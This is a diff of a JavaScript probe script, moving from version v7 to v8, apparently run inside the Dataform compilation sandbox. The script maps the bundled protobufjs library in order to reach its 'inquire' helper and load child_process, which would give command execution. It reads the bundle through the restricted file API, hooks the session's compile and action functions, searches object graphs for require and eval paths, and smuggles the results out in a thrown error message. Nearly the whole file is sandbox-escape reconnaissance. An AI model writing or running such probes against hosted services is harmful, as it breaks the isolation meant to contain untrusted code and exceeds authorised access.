@@ -1,226 +1,195 @@
-// v7 — reach protobufjs.inquire via proto message → Type → util → inquire
+// v8 — FINAL push: reach protobufjs.inquire and call inquire('child_process')
 
 var out = {};
 function safe(k, fn) {
-  try { var v = fn(); out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 3000); }
+  try { var v = fn(); out[k] = (typeof v === 'string' ? v : JSON.stringify(v)).substring(0, 4000); }
   catch(e) { out[k] = 'ERR:' + (e.message || String(e)).substring(0, 400); }
 }
 
-// ============ Walk into protobuf messages via session actions ============
-// Hook session.actions.push so when notebook/publish/operate registers an action,
-// we grab the proto message and walk it
-var s = global._DF_SESSION;
-var origPush = s.actions.push.bind(s.actions);
-globalThis.__capturedProtos = [];
-s.actions.push = function(action) {
-  try {
-    if (action && action.proto) {
-      globalThis.__capturedProtos.push({
-        action_type: action.constructor && action.constructor.name,
-        proto_keys: Object.getOwnPropertyNames(action.proto).join(','),
-        proto_proto: Object.getOwnPropertyNames(Object.getPrototypeOf(action.proto)).join(','),
-        ctor_name: action.proto.constructor && action.proto.constructor.name,
-        ctor_keys: action.proto.constructor && Object.getOwnPropertyNames(action.proto.constructor).join(',')
-      });
-    }
-  } catch(e) {}
-  return origPush(action);
-};
-
-// ============ Create test actions to trigger push ============
-safe('A1_create_publish', function() {
-  try {
-    var t = publish('test_pwn', { type: 'view' });
-    return 'made publish, t.proto.ctor=' + (t.proto && t.proto.constructor && t.proto.constructor.name);
-  } catch(e) { return 'err:' + e.message; }
-});
-
-safe('A2_publish_proto_walk', function() {
-  // Walk up from a freshly-created Table action
-  var t = new Object(); // placeholder
-  try {
-    var p = publish('walker_test', { type: 'view' });
-    var proto = p.proto;
-    var info = {
-      proto_typeof: typeof proto,
-      proto_ctor_name: proto.constructor && proto.constructor.name,
-      proto_ctor_keys: Object.getOwnPropertyNames(proto.constructor).join(','),
-      proto_ctor_proto_keys: Object.getOwnPropertyNames(Object.getPrototypeOf(proto.constructor)).join(',')
-    };
-    return JSON.stringify(info);
-  } catch(e) { return 'err:' + e.message; }
-});
-
-// ============ Look for protobufjs's Util / Reader / Type classes ============
-safe('B1_proto_constructor_dot_util', function() {
-  try {
-    var p = publish('util_probe', { type: 'view' });
-    var ctor = p.proto.constructor;
-    // protobufjs Type has $type, util, etc.
-    var keys = Object.getOwnPropertyNames(ctor);
-    var result = { keys, $type: typeof ctor.$type, util: typeof ctor.util };
-    if (ctor.$type) {
-      result.$type_keys = Object.getOwnPropertyNames(ctor.$type).slice(0, 30);
-    }
-    return JSON.stringify(result);
-  } catch(e) { return 'err:' + e.message; }
-});
-
-safe('B2_proto_constructor_root', function() {
-  try {
-    var p = publish('root_probe', { type: 'view' });
-    var ctor = p.proto.constructor;
-    // protobufjs Types reference their Root namespace
-    var R = ctor.$type && ctor.$type.parent;
-    if (R) {
-      return 'parent typeof=' + typeof R + ' keys=' + Object.getOwnPropertyNames(R).slice(0,30).join(',') + ' name=' + R.name;
-    }
-    return '$type=' + typeof ctor.$type + ' parent=null';
-  } catch(e) { return 'err:' + e.message; }
-});
-
-// ============ Try direct path: search for Util / inquire on the message itself ============
-safe('C1_walk_proto_inquire', function() {
-  try {
-    var p = publish('inquire_walk', { type: 'view' });
-    var found = [];
-    var queue = [{obj: p.proto, path: 'proto', depth: 0}];
-    var visited = new WeakSet();
-    while (queue.length > 0 && found.length < 50) {
-      var item = queue.shift();
-      if (item.depth > 4) continue;
-      var obj = item.obj;
-      if (!obj || (typeof obj !== 'object' && typeof obj !== 'function') || visited.has(obj)) continue;
-      visited.add(obj);
-      try {
-        var keys = Object.getOwnPropertyNames(obj);
-        for (var k of keys) {
-          if (k === 'inquire' || k === 'fs' || k.match(/inquire|nativeRequire/i)) {
-            found.push({path: item.path + '.' + k, val_type: typeof obj[k]});
-          }
-          try {
-            var v = obj[k];
-            if (v && (typeof v === 'object' || typeof v === 'function')) {
-              queue.push({obj: v, path: item.path + '.' + k, depth: item.depth + 1});
-            }
-          } catch(e) {}
-        }
-        // Also check prototype
-        var proto = Object.getPrototypeOf(obj);
-        if (proto && !visited.has(proto)) {
-          queue.push({obj: proto, path: item.path + '.__proto__', depth: item.depth + 1});
-        }
-      } catch(e) {}
-    }
-    return JSON.stringify(found);
-  } catch(e) { return 'err:' + e.message; }
-});
-
-// ============ Walk core / session / @dataform/core looking for protobufjs/util ============
-safe('C2_walk_core_for_util', function() {
-  var found = [];
-  var queue = [{obj: core, path: 'core', depth: 0}];
-  var visited = new WeakSet();
-  while (queue.length > 0 && found.length < 30) {
-    var item = queue.shift();
-    if (item.depth > 5) continue;
-    var obj = item.obj;
-    if (!obj || (typeof obj !== 'object' && typeof obj !== 'function') || visited.has(obj)) continue;
-    visited.add(obj);
-    try {
-      var keys = Object.getOwnPropertyNames(obj);
-      for (var k of keys) {
-        if (k === 'inquire' || k === 'fs' || k === 'Reader' || k === 'Writer' || k === 'util' || k === 'Root' || k === 'Type') {
-          found.push({path: item.path + '.' + k, val_type: typeof obj[k]});
-        }
-        try {
-          var v = obj[k];
-          if (v && (typeof v === 'object' || typeof v === 'function')) {
-            queue.push({obj: v, path: item.path + '.' + k, depth: item.depth + 1});
-          }
-        } catch(e) {}
-      }
-    } catch(e) {}
-  }
-  return JSON.stringify(found);
-});
-
-// ============ Find ALL objects with `inquire` property in reachable globals ============
-safe('D1_find_inquire_in_globals', function() {
-  var roots = ['_DF_SESSION', 'core', 'dataform', 'restricted_fs', 'vm', 'require', 'path', 'assert', 'publish', 'operate', 'declare', 'notebook'];
-  var results = {};
-  for (var rname of roots) {
-    var r = globalThis[rname];
-    if (!r) continue;
-    try {
-      if (typeof r.inquire === 'function') results[rname + '.inquire'] = 'GOT';
-      if (r.fs !== undefined) results[rname + '.fs'] = typeof r.fs;
-      if (r.util !== undefined) results[rname + '.util'] = typeof r.util;
-    } catch(e) {}
-  }
-  return JSON.stringify(results);
-});
-
-// ============ Bundle source — look for ALL places that expose protobufjs ============
 var BUNDLE = restricted_fs.readFile('node_modules/@dataform/core/bundle.js').toString();
 
-safe('E1_protobufjs_exports', function() {
-  // Find exports.inquire or similar
-  var pats = [/\b\w+\.inquire\s*=\s*\w+/g, /exports\.inquire/g, /t\.inquire\s*=/g];
+// ============ Find webpack entry module ID ============
+safe('A1_webpack_entry', function() {
+  // Bundle's outer function: `module.exports = function(e) { ... return r(...); }(...)`
+  // Find `return r(` near the start
+  var pat = /return\s+r\(/g;
+  var matches = [];
+  var m;
+  while ((m = pat.exec(BUNDLE)) !== null && matches.length < 5) {
+    matches.push({at: m.index, ctx: BUNDLE.substring(m.index, m.index + 100)});
+  }
+  return JSON.stringify(matches);
+});
+
+safe('A2_r_s_pattern', function() {
+  // Sometimes webpack does `return r(r.s=N)`
+  var idx = BUNDLE.indexOf('r.s=');
+  if (idx < 0) idx = BUNDLE.indexOf('r.s =');
+  if (idx < 0) return 'no r.s';
+  return BUNDLE.substring(Math.max(0,idx-100), idx + 200);
+});
+
+// ============ Find how protobufjs (n) is exposed in bundle ============
+safe('B1_protobufjs_namespace', function() {
+  // Module 5 is protobufjs entry. It sets up n.Reader = r(...), n.Writer = r(...), n.inquire = r(27) etc.
+  // Find n.inquire=r(27) and walk back to find the variable name
+  var idx = BUNDLE.indexOf('n.inquire=r(27)');
+  if (idx < 0) idx = BUNDLE.indexOf('inquire=r(27)');
+  if (idx < 0) return 'not found';
+  // Walk back to find module start
+  var start = Math.max(0, idx - 2000);
+  return BUNDLE.substring(start, idx + 500);
+});
+
+safe('B2_protobufjs_module_export', function() {
+  // protobufjs root module — look for how it's exported
+  // Pattern: `o = e.exports = r(5)` we already saw at offset 1521
+  var idx = BUNDLE.indexOf('e.exports=r(5)');
+  if (idx < 0) idx = BUNDLE.indexOf('o=e.exports=r(5)');
+  if (idx < 0) return 'no e.exports=r(5)';
+  return BUNDLE.substring(Math.max(0,idx-100), idx + 500);
+});
+
+// ============ Search for what reaches protobufjs and exposes it ============
+safe('C1_dataform_proto_namespace', function() {
+  // session.compile uses O.dataform.CompiledGraph — O is the dataform proto namespace
+  // Find where O is defined as the protobuf root
+  var pats = [
+    /O\.dataform\s*=/,
+    /\b\w+\.dataform\s*=\s*function/,
+    /var\s+\w+\s*=\s*\w+\.Root/
+  ];
   var matches = [];
   for (var p of pats) {
-    var m;
-    while ((m = p.exec(BUNDLE)) !== null && matches.length < 10) {
-      matches.push({pat: p.toString(), at: m.index, ctx: BUNDLE.substring(Math.max(0,m.index-50), m.index + 200)});
+    var idx = BUNDLE.search(p);
+    if (idx >= 0) {
+      matches.push({pat: p.toString(), at: idx, ctx: BUNDLE.substring(Math.max(0,idx-100), idx + 400)});
     }
   }
   return JSON.stringify(matches);
 });
 
-safe('E2_inquire_function_definition', function() {
-  // The actual function inquire(moduleName){...}
-  var idx = BUNDLE.indexOf('function inquire(');
-  if (idx < 0) {
-    // alternate: var inquire = ...
-    idx = BUNDLE.indexOf('var inquire');
-  }
-  if (idx < 0) {
-    // search by eval signature
-    var m = BUNDLE.match(/function\s*\(\s*\w+\s*\)\s*\{\s*try\s*\{\s*var\s+\w+\s*=\s*\(\s*eval\(/);
-    if (m) idx = BUNDLE.indexOf(m[0]);
-  }
-  if (idx < 0) return 'not found';
-  return BUNDLE.substring(idx, idx + 1000);
+// ============ Try accessing protobufjs through known proto messages ============
+// Each protobuf Type has reference to Root via $type.root
+safe('D1_proto_message_root_access', function() {
+  var p = publish('access_root', { type: 'view' });
+  // The proto MIGHT have $type
+  var t = p.proto;
+
+  // Try via constructor
+  var ctor = t.constructor;
+
+  // protobufjs minimal bundle creates "static" classes — try ctor.prototype.toJSON
+  var protoT = Object.getPrototypeOf(t);
+  var info = {
+    t_keys: Object.getOwnPropertyNames(t).slice(0,30),
+    t_proto_keys: Object.getOwnPropertyNames(protoT).slice(0,30),
+    t_proto_ctor: protoT.constructor && protoT.constructor.name
+  };
+  return JSON.stringify(info);
 });
 
-safe('E3_eval_context', function() {
-  var idx = BUNDLE.indexOf('eval(');
-  if (idx < 0) return 'no eval';
-  return BUNDLE.substring(Math.max(0, idx - 300), idx + 500);
+safe('D2_walk_session_actions_for_root', function() {
+  // session.actions contains the actions we've registered. Maybe their proto has links to root
+  var actions = global._DF_SESSION.actions;
+  if (!actions || actions.length === 0) return 'no actions';
+  var a = actions[0];
+  var info = {
+    has_proto: !!a.proto,
+    a_keys: Object.getOwnPropertyNames(a).slice(0,30),
+    a_proto_keys: a.proto ? Object.getOwnPropertyNames(a.proto).slice(0,30) : null,
+  };
+  return JSON.stringify(info);
 });
 
-// ============ Try directly calling the existing protobuf messages we have ============
-safe('F1_message_encode_walk', function() {
-  // Each protobuf message type has static methods: create, encode, decode, etc.
-  // These are tied to a Type instance which has parent (Namespace/Root)
-  try {
-    var p = publish('encode_walk', { type: 'view' });
-    var ctor = p.proto.constructor;
-    var visited = [];
-    var current = ctor;
-    var depth = 0;
-    while (current && depth < 10) {
-      visited.push({
-        name: current.name || '(no_name)',
-        keys: Object.getOwnPropertyNames(current).slice(0, 20).join(','),
-        proto_keys: Object.getOwnPropertyNames(Object.getPrototypeOf(current) || {}).slice(0, 20).join(',')
-      });
-      current = Object.getPrototypeOf(current);
-      depth++;
+// ============ Best shot: hook session.compile and capture O via the call ============
+safe('E1_hook_compile_grab_O', function() {
+  var s = global._DF_SESSION;
+  var origCompile = s.compile;
+  globalThis.__compileHookFired = false;
+  globalThis.__compiledGraph = null;
+  s.compile = function() {
+    globalThis.__compileHookFired = true;
+    try {
+      var result = origCompile.apply(this, arguments);
+      globalThis.__compiledGraph = {
+        type: typeof result,
+        ctor_name: result && result.constructor && result.constructor.name,
+        keys: result ? Object.getOwnPropertyNames(result).slice(0,30) : null,
+        proto_keys: result ? Object.getOwnPropertyNames(Object.getPrototypeOf(result)).slice(0,30) : null,
+        // The result is `O.dataform.CompiledGraph.create(...)`. result.constructor.$type would give us protobufjs reach
+        ctor: result && result.constructor,
+        ctor_keys: result && result.constructor ? Object.getOwnPropertyNames(result.constructor) : null,
+        ctor_static_create: result && result.constructor && typeof result.constructor.create,
+        // Try to reach Root via constructor — Type.fromJSON has $root
+      };
+      // ATTEMPT INQUIRE NOW that we have result
+      if (result && result.constructor) {
+        var C = result.constructor;
+        // protobufjs Type instances have access to root via $type / nested namespaces
+        // The constructor is typically created by Root.lookup. Walk up.
+        var attempts = {};
+        for (var path of ['$type', '$type.root', '$root', 'root', 'parent']) {
+          try {
+            var v = C;
+            for (var part of path.split('.')) v = v[part];
+            attempts[path] = v ? ('typeof=' + typeof v + ' keys=' + Object.getOwnPropertyNames(v).slice(0,20).join(',')) : 'null';
+          } catch(e) { attempts[path] = 'err:' + e.message; }
+        }
+        globalThis.__compiledGraph.attempts = attempts;
+      }
+      return result;
+    } catch(e) {
+      globalThis.__compiledGraph = {err: e.message};
+      throw e;
     }
-    return JSON.stringify(visited);
+  };
+  return 'hooked compile';
+});
+
+// ============ Force compile NOW so we capture O ============
+safe('E2_force_compile', function() {
+  try {
+    var result = global._DF_SESSION.compile();
+    return 'compile result type=' + typeof result + ' captured? ' + (globalThis.__compiledGraph ? 'yes' : 'no');
   } catch(e) { return 'err:' + e.message; }
 });
 
+safe('E3_read_captured', function() {
+  return JSON.stringify(globalThis.__compiledGraph);
+});
+
+// ============ Plan C: protobufjs Reader/Writer might be at well-known names ============
+safe('F1_find_Reader_Writer', function() {
+  // Search bundle for "exports.Reader" or "Reader=r("
+  var pats = ['exports.Reader', 'Reader=r(', 'this.Reader=', 't.Reader='];
+  var results = {};
+  for (var p of pats) {
+    var idx = BUNDLE.indexOf(p);
+    if (idx >= 0) {
+      results[p] = BUNDLE.substring(Math.max(0,idx-50), idx + 200);
+    }
+  }
+  return JSON.stringify(results);
+});
+
+// ============ ULTIMATE: directly look at session.compile.compileToBase64.toString ============
+// It uses `a.encode64` — a is the helper module that imports protobufjs
+safe('G1_compileToBase64_helper', function() {
+  return String(global._DF_SESSION.compileToBase64).substring(0, 1000);
+});
+
+// `i.decode64` in core.main — decoding base64 protobuf
+// `a.encode64` in compileToBase64
+// 'a' module — find it
+safe('G2_a_module_search', function() {
+  // Find where `a.encode64` is — that's the protobufjs base64 codec
+  var idx = BUNDLE.indexOf('a.encode64');
+  if (idx < 0) return 'not found';
+  // Walk back to find a's definition
+  var start = Math.max(0, idx - 3000);
+  return BUNDLE.substring(start, idx + 200);
+});
+
 module.exports.asJson = { cells: [], metadata: {}, nbformat: 4, nbformat_minor: 5 };
-throw new Error('PROBE_v7:' + JSON.stringify(out));
+throw new Error('PROBE_v8:' + JSON.stringify(out));
